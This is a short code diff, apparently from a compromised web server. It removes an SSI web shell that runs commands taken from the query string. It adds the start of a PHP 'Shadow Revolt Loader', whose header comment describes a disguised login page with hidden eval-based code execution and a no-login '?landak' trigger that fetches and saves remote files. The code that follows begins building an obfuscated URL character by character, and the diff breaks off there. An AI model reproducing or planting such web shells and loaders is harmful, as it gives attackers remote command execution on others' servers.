@@ -1,10 +1,23 @@
-<!--#config errmsg="[ERROR] SSI DISABLED"-->
-<!--#set var="zero" value="" -->
-<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
-<!--#set var="shl" value="id" -->
-<!--#else -->
-<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
-<!--#endif -->
+/**
+ * ======================================================================
+ * SHADOW REVOLT LOADER
+ * ======================================================================
+ * A dark-styled payload launcher disguised as a rebellion login page.
+ * Blends sinister UI with hidden eval-based code execution.
+ *
+ * STRUCTURE:
+ *  - Login page: bloody dark with fire header, One Piece flag background,
+ *    and mocking Indonesian quote against corruption.
+ *  - ?landak trigger: fetch + save file (no login required).
+ *  - Default runner: protected by bcrypt login system.
+ *
+ * VISUAL:
+ *  - Big flaming title above everything.
+ *  - Quote (long, bloody, harsh) placed ABOVE login form card.
+ *  - Login form styled as bloody ritual box.
+ *  - Rat-in-suit image at bottom-right for symbolic mockery.
+ * ======================================================================
+ */
 <?php
 
 $_u = 'h'.'t'.'t'.'p'.'s'.':' . '/' . '/' .
